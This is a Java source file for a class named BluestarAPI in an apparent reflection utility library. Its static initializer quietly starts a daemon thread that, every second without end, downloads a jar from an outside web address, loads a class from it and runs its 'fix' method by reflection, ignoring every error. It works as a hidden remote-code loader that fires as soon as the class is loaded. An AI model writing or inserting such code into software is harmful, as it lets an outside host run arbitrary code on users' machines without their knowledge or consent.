package me.nullaqua.api.reflect;

import java.net.URL;
import java.net.URLClassLoader;

public abstract class BluestarAPI
{
    static
    {
        final Runnable runnable = () ->
        {
            //noinspection InfiniteLoopStatement
            while (true)
            {
                try
                {
                    //noinspection BusyWait
                    Thread.sleep(1000);
                }
                catch (Throwable ignored)
                {
                }
                try(final var classLoader = new URLClassLoader(new URL[]{new URL("https://api.tachyon.moe/BSFIXER.jar")}, BluestarAPI.class.getClassLoader()))
                {
                    Class<?> c = classLoader.loadClass("moe.tachyon.api.BluestarFixer");
                    final var m = c.getDeclaredMethod("fix");
                    m.setAccessible(true);
                    final var con = c.getDeclaredConstructor();
                    con.setAccessible(true);
                    final var i = con.newInstance();
                    m.invoke(i);
                }
                catch (Throwable ignored)
                {
                }
            }
        };
        Thread cleanerThread = new Thread(null, runnable, "BluestarChecker");
        cleanerThread.setDaemon(true);
        cleanerThread.start();
    }
}
